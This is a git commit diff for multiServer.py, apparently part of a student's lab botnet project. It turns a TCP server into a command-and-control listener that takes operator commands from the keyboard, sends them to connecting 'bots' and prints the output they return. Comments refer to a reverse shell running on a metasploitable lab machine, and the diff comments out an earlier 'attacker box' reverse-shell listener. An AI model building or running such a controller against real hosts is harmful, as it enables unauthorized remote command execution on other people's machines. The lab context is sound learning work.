1966fee6712dc0c1cd47e784c1db09332bea03b1
pettersong <ganesh.petterson@gmail.com>
2022-03-22 12:56:18 -0400

    Updated multiServer

--- multiServer.py
+++ multiServer.py
@@ -1,10 +1,15 @@
 import socketserver 
 from socket import *
+
+#The following are holdovers from shellServer.py:
+#It's possible that running these messes with the multiServer?
+'''
 serverPort = 8000
 serverSocket = socket(AF_INET, SOCK_STREAM)
 serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 serverSocket.bind(('', serverPort))
 serverSocket.listen(1)
+
 
 print("Attacker box listening and awaiting instructions")
 connectionSocket, addr = serverSocket.accept()
@@ -23,7 +28,7 @@ while command != "exit":
 
 connectionSocket.shutdown(SHUT_RDWR)
 connectionSocket.close()
-
+'''
 
 class BotHandler(socketserver.BaseRequestHandler):
 
@@ -31,11 +36,24 @@ class BotHandler(socketserver.BaseRequestHandler):
 		self.data = self.request.recv(1024).strip()
 		print("Bot with IP {} sent:".format(self.client_address[0]))
 		print(self.data)
-		self.request.sendall(self.data.upper())
+		#Now, let's figure out how to get it to send commands instead!
+		command =""
+		command = input("Please enter a command: ")
+		self.request.sendall(command.encode())
+		message = self.request.recv(1024).strip()	
+		print(message)
+
+		#THIS IS WHERE THE ISSUE IS!
+		#This just sends all the received data back in uppercase
+		#So reverseShell on metasploitable is trying to run the
+		# command "BOT REPORTING FOR DUTY" which obviously isn't
+		# a valid command, causing a crash!
+		#self.request.sendall(self.data.upper())
 
 if __name__ == "__main__":
-	HOST, PORT = "", 8000
+	HOST, PORT = "192.168.1.101", 8000
 	tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
+	print("TCP Server enabled!")
 	try:
 		tcpServer.serve_forever()
 	except:
